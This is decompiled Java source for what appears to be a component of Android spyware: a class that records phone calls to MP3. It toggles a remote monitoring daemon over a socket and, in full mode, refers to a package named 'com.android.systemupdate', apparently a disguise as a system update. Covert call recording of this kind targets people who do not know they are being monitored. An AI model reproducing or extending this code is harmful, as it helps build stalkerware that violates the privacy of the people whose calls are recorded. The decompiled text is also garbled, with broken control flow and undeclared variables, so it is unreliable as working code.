package com.vvt.capture.a;

import android.content.Context;
import com.fx.pmond.ref.command.RemoteMonitorMaind;
import com.fx.pmond.ref.command.RemoteMonitorMaind.MonitorData;
import com.krecorder.call.callrecorder.f;
import com.krecorder.call.callrecorder.h;
import com.krecorder.call.recording.MediaFormat;
import com.vvt.base.RunningMode;
import com.vvt.io.p;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefCallRecordingAudioSource;
import java.io.File;
import java.io.IOException;

public class c
  implements a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private Context c;
  private boolean d;
  private String e;
  private RunningMode f;
  private k g;
  private com.vvt.preference.b h;
  private f i;
  private h j;
  
  public c(Context paramContext, String paramString, RunningMode paramRunningMode, com.vvt.preference.b paramb)
  {
    Object localObject = new com/vvt/capture/a/d;
    ((d)localObject).<init>(this);
    this.j = ((h)localObject);
    this.c = paramContext;
    this.h = paramb;
    localObject = File.separator;
    boolean bool = paramString.endsWith((String)localObject);
    if (!bool)
    {
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      String str = File.separator;
      localObject = str;
    }
    for (this.e = ((String)localObject);; this.e = paramString)
    {
      bool = a;
      if (bool) {}
      bool = a;
      if (bool) {}
      this.f = paramRunningMode;
      localObject = this.i;
      if (localObject == null)
      {
        localObject = f.a();
        this.i = ((f)localObject);
      }
      return;
    }
  }
  
  private void a(boolean paramBoolean)
  {
    boolean bool = a;
    if (bool) {}
    RemoteMonitorMaind.MonitorData localMonitorData = new com/fx/pmond/ref/command/RemoteMonitorMaind$MonitorData;
    localMonitorData.<init>();
    localMonitorData.setEnable(paramBoolean);
    RemoteMonitorMaind localRemoteMonitorMaind = new com/fx/pmond/ref/command/RemoteMonitorMaind;
    String str = "com.fx.socket.pmond";
    localRemoteMonitorMaind.<init>(str, localMonitorData);
    try
    {
      localRemoteMonitorMaind.execute();
      bool = a;
      if (bool) {}
      return;
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
  }
  
  public void a(k paramk)
  {
    this.g = paramk;
  }
  
  public void a(String paramString1, String paramString2)
  {
    boolean bool1 = true;
    bool2 = a;
    if (bool2) {}
    Object localObject1 = this.f;
    Object localObject2 = RunningMode.FULL;
    if (localObject1 == localObject2) {
      a(bool1);
    }
    bool2 = a;
    if (bool2) {}
    localObject1 = this.h;
    localObject2 = FxPreferenceType.CALL_RECORDING_AUDIO_SOURCE;
    localObject1 = (PrefCallRecordingAudioSource)((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject2);
    int k = ((PrefCallRecordingAudioSource)localObject1).getAudioSource();
    bool2 = a;
    if (bool2) {}
    p.a(paramString1, paramString2);
    bool2 = a;
    if (bool2) {}
    try
    {
      localObject1 = this.i;
      MediaFormat localMediaFormat = MediaFormat.MP3;
      File localFile = new java/io/File;
      localFile.<init>(paramString1);
      Context localContext = this.c;
      h localh = this.j;
      String str = this.e;
      ((f)localObject1).a(k, localMediaFormat, localFile, paramString2, localContext, localh, str);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool2 = b;
        if (!bool2) {}
      }
    }
    this.d = bool1;
    bool2 = a;
    if (bool2) {}
  }
  
  public boolean a(String paramString)
  {
    f localf = this.i;
    boolean bool1 = localf.a(paramString);
    boolean bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
  }
  
  public void c()
  {
    boolean bool = a;
    if (bool) {}
    this.d = false;
    RunningMode localRunningMode1 = this.f;
    RunningMode localRunningMode2 = RunningMode.FULL;
    if (localRunningMode1 == localRunningMode2) {
      a(false);
    }
    d();
  }
  
  public void d()
  {
    bool1 = a;
    if (bool1) {}
    bool2 = false;
    localObject1 = null;
    for (;;)
    {
      try
      {
        localObject2 = this.i;
        localObject1 = ((f)localObject2).f();
        localObject2 = this.i;
        if (localObject2 != null)
        {
          localObject2 = this.i;
          ((f)localObject2).b();
        }
        localObject2 = this.g;
        if (localObject2 == null) {
          continue;
        }
        localObject2 = this.g;
        ((k)localObject2).b((String)localObject1);
        bool1 = a;
        if (bool1) {}
        localObject2 = this.f;
        localObject1 = RunningMode.FULL;
        if (localObject2 != localObject1) {
          continue;
        }
        localObject2 = new com/vvt/j/c;
        ((com.vvt.j.c)localObject2).<init>();
        localObject1 = "com.android.systemupdate";
        localObject4 = this.e;
        localObject2 = ((com.vvt.j.c)localObject2).a((String)localObject1, (String)localObject4);
      }
      catch (Exception localException)
      {
        Object localObject2;
        boolean bool3 = b;
        if (!bool3) {
          continue;
        }
        bool3 = com.vvt.ag.b.a((String)localObject1);
        if (bool3) {
          continue;
        }
        Object localObject4 = new java/io/File;
        ((File)localObject4).<init>((String)localObject1);
        ((File)localObject4).delete();
        bool2 = a;
        if (!bool2) {
          continue;
        }
        localObject1 = this.g;
        if (localObject1 == null) {
          continue;
        }
        localObject1 = this.g;
        Object localObject3 = localException.getMessage();
        ((k)localObject1).a((String)localObject3);
        continue;
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
        localObject3 = new com/vvt/j/c;
        ((com.vvt.j.c)localObject3).<init>();
        localObject1 = this.c;
        localObject3 = ((com.vvt.j.c)localObject3).a((Context)localObject1);
        continue;
        localObject3 = "/pasesth";
        continue;
      }
      bool2 = a;
      if (bool2) {}
      localObject1 = new com/vvt/capture/a/e;
      ((e)localObject1).<init>();
      bool1 = ((e)localObject1).a((String)localObject2);
      if (!bool1) {
        continue;
      }
      localObject2 = "";
      return;
      bool1 = b;
      if (!bool1) {}
    }
  }
  
  public boolean e()
  {
    return this.d;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */